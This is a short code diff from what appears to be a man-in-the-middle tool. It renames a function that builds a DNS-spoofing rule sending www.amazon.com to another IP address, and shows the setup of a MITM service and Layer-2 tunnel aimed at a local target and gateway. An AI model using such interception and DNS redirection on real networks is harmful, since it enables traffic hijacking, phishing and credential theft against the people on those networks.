@@ -13,7 +13,7 @@ def main():
     target = '192.168.1.127'
     gateway = '192.168.1.1'
 
-    disrupt_dns_rule = disruption_rules.change_dns_responses('www.amazon.com', '104.16.41.71')
+    disrupt_dns_rule = disruption_rules.generate_dns_reassign_rule('www.amazon.com', '104.16.41.71')
 
     mitm = MITMService(target_ip=target, gateway_ip=gateway, interval=0.5)
     tunnel = L2Tunnel(target_mac=target_mac, gateway_mac=gateway_mac, my_mac=my_mac, target_ip=target, interface='eno1')
